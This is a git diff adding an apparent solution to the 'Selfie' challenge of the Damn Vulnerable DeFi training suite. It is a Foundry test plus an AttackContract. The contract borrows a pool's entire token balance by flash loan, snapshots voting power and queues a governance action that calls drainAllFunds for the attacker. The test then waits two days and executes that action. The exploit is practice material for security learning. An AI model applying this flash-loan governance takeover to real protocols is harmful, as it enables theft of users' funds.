@@ -48,6 +48,17 @@ contract Selfie is Test {
          * EXPLOIT START *
          */
 
+        vm.startBroadcast(attacker);
+        AttackContract attackContract = new AttackContract(selfiePool, simpleGovernance,dvtSnapshot, attacker);
+        attackContract.callFlashLoan();
+        uint256 currentTime = block.timestamp; 
+        uint256 twoDaysLater = currentTime + 2 days;
+        vm.warp(twoDaysLater);
+        uint256 actionId = attackContract.actionId();
+        // attackContract.execute();
+        simpleGovernance.executeAction(actionId);
+        vm.stopBroadcast();
+
         /**
          * EXPLOIT END *
          */
@@ -61,3 +72,45 @@ contract Selfie is Test {
         assertEq(dvtSnapshot.balanceOf(address(selfiePool)), 0);
     }
 }
+contract AttackContract {
+    SelfiePool pool;
+    SimpleGovernance simpleGovernanceInstance;
+    DamnValuableTokenSnapshot dvtSnapshot;
+    address attacker;
+    uint256 amountToBorrow; 
+    uint256 public actionId; 
+    constructor (SelfiePool _pool, SimpleGovernance _simpleGouvernanceInstance, DamnValuableTokenSnapshot _damnValuableTokenSnapshot, address _attacker) {
+        pool = _pool;
+        simpleGovernanceInstance = _simpleGouvernanceInstance;
+        dvtSnapshot = _damnValuableTokenSnapshot;
+        attacker = _attacker;
+    }
+
+    function callFlashLoan () public {
+        amountToBorrow = dvtSnapshot.balanceOf(address(pool));
+        pool.flashLoan(amountToBorrow);
+    }
+
+    function receiveTokens(address token, uint256 borrowAmount) public {
+        bytes memory data= abi.encodeWithSignature("drainAllFunds(address)", address(attacker));
+        dvtSnapshot.snapshot();
+        actionId = simpleGovernanceInstance.queueAction(address(pool), data, 0);
+        dvtSnapshot.transfer(address(pool), borrowAmount); ///everything's good til here
+
+
+    }
+
+
+}
+
+/* Small description of the attack : 
+
+1. Call a flash loan ✅
+2. Try to queue an action, this action has to set the attacker as owner of SelfiePool ✅
+3. Give back the FlashLoan✅
+4. Make 2 days pass ✅
+5. Execute the action ✅
+6. Make the attacker call drainAllFunds  ✅
+
+
+*/
